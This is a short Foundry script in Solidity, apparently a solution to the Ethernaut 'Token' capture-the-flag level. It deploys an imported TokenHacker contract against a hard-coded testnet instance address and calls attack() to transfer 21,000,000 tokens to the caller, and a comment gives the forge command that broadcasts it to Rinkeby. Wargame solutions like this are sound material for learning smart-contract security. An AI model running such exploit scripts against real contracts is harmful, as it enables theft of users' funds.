// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Ethernaut/Token/TokenHacker.sol";
import "forge-std/console.sol";

//Execute
//forge script script/Token.s.sol:TokenScript --rpc-url $RINKEBY_RPC_URL --broadcast --private-key $PRIVATE_KEY --verify --etherscan-api-key $ETHERSCAN_KEY
   
contract TokenScript is Script {
    function setUp() public {}

    function run() public {

        console.log("####1");
        vm.startBroadcast();
        console.log(msg.sender);

        console.log("####2");
        TokenHacker hacker = new TokenHacker(0x8fa271ba5E1604cA0dA0BD7A6043c848A2fFDcc8);
        console.log(address(this));
        hacker.attack(msg.sender, 21000000);
        
        console.log("####3");
        vm.stopBroadcast();
        
        console.log("####4");
    }
}
